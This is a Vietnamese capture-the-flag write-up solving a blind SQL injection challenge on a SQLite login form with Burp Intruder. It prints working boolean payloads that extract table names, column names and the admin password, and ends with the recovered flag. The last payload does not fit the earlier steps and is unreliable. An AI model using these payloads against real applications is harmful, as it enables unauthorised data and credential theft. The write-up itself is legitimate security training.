# SQL injection - Blind

<img width="1505" height="501" alt="image" src="https://github.com/user-attachments/assets/d606b899-6316-4355-ab23-9505bfe6b97e" />

Vào Challenge thì cho một giao diện như vầy

<img width="591" height="323" alt="image" src="https://github.com/user-attachments/assets/690af7c9-ca67-4a4f-a2b2-032b1f4e6ea3" />


Thử test payload `' or 1=1 -- -` coi có được không thì nó có hiện ra thông tin user1

<img width="437" height="409" alt="image" src="https://github.com/user-attachments/assets/78a57680-9fc9-4502-ace3-d00597bd1132" />

Thử thêm bất cứ payload nào , nếu điều kiện ở where luôn đúng thì nó vẫn cứ trả về cái thông tin user1 kia. Còn nếu sai thì nó báo là no such user/password

Vậy thì chúng ta có thể dựa vào đây để sử dụng Blind rồi 

<img width="441" height="295" alt="image" src="https://github.com/user-attachments/assets/0ad31412-efcf-4617-a470-31183e1d6adc" />

Đầu xác định tên bảng, sử dụng hàm substr để đoán từng kí tự của bảng đó . Sử dụng payload này
```sql
' or substr((select name from sqlite_master where type='table'),1,1)='a' -- -
```
Rồi add to instruder và attack 

Và kết quả được bảng tên users

<img width="1256" height="761" alt="users blind" src="https://github.com/user-attachments/assets/20657893-fcf1-416c-9f08-18e28ac39e29" />


Tiếp theo xác định danh sách cột trong bảng đó, cũng sử dụng hàm substr để đoán từng kí tự của từng cột một 
```sql
' or substr((SELECT name FROM pragma_table_info('users') LIMIT 1 OFFSET 1),1,1)='a' -- -
```
Rồi add to instruder và attack 

<img width="1257" height="791" alt="column password blind" src="https://github.com/user-attachments/assets/ce51aeb1-8148-4d8e-8652-9c3c85093dbe" />

Chúng ta được cột thứ nhất là password 

Tiếp tục thêm cột thứ hai cũng làm tương tự . Thay thành OFFSET 2
```sql
' or substr((SELECT name FROM pragma_table_info('users') LIMIT 1 OFFSET 2),1,1)=char(1) -- -
```
Rồi add to instruder và attack 

<img width="1829" height="767" alt="image" src="https://github.com/user-attachments/assets/03cc13c6-5422-49be-a5a3-0b8ff8e90ab4" />

Và cột tiếp theo là cột `Year`

Và cuối cùng lấy password admin thôi 

```sql
' or substr((SELECT (password) FROM pragma_table_info('users')),1,1)=char(1) -- -
```

<img width="1824" height="871" alt="image" src="https://github.com/user-attachments/assets/66801302-42d1-4250-94ed-29b5942e790c" />

Decode hex nó ra 
```
password: e2azO93i
```

Chúng ta done Challenge này!!!


